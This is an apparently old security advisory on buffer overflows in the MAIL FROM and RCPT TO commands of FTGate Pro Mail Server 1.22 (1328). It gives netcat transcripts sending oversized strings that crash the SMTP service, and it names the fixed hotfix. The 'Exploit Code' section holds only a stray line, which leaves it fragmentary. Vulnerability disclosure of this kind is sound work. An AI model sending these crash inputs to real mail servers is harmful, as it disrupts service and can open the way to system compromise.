Subject: Multiple Buffer Overflow Vulnerabilities Found in FTGate Pro Mail Server v. 1.22 (1328)


                    Multiple Buffer Overflow Vulnerabilities
                 Found in FTGate Pro Mail Server v. 1.22 (1328)

-----[SUMMARY
FTGatePro is Floosietek's flagship server. The comprehensive feature set 
In this server ensures that it will meet whatever demands you place on it. 
This server is powerful enough for the most demanding of tasks.

The problem is a Buffer Overflow in the SMTP protocol, within the 
ESMTP Server FTGate, causing the service to stop responding for a short
Period, where we can actually overwrite the exception handler on the stack
allowing 
A system compromise with code execution running as SYSTEM.


-----[AFFECTED SYSTEMS
Vulnerable systems:
 * FTGate Pro Mail Server v. 1.22 (1328)

Immune systems:
 * FTGate Pro Mail Server v. 1.22 (HotFix 1330)

-----[SEVERITY
Medium/High - An attacker is able to cause a DoS attack on the SMTP
protocol.
              And we can actually overwrite the exception handler on the
stack 
              Allowing a system compromise with code execution running as
SYSTEM.
              

-----[DESCRIPTION OF WHAT THE VULNERABILITY IS
The Vulnerability is a Buffer Overflow in the FTGate Pro Mail Server v. 1.22
(1328) When a malicious attacker sends a large amount into the "MAIL FROM"
and the "RCPT TO" The buffer will overflow. If the code was carefully
crafted, attackers could execute 
Arbitrary command in system privilege.

The following transcript demonstrates a sample exploitation of the 
Vulnerabilities:
----------------------------- [Transcript] ----------------------------- nc
warlab.dk 25 220 win2k-serv ESMTP Server FTGate HELO Foobar 250 win2k-serv
Mail From : <aaaaa....[BUFFER about 2000 Bytes @ and 2000 bytes again ending
with ".com"] <Connection closed>

The same Vulnerability is in the RCPT TO
nc warlab.dk 25
220 win2k-serv ESMTP Server FTGate
HELO Foobar
250 win2k-serv
Mail From : admin@...lab.dk
250 <admin@...lab.dk> Sender Ok
Rcpt To: <aaaaa....[BUFFER about 2000 Bytes @ and 2000 bytes again ending
with ".com"] <connection closed>

close($sock);
----------------------------- [Exploit Code] -----------------------------

When this attack is preformed the service will shortly stop and then restart
after about 5-10 seconds, all current connections when this attack is
preformed will be closed.
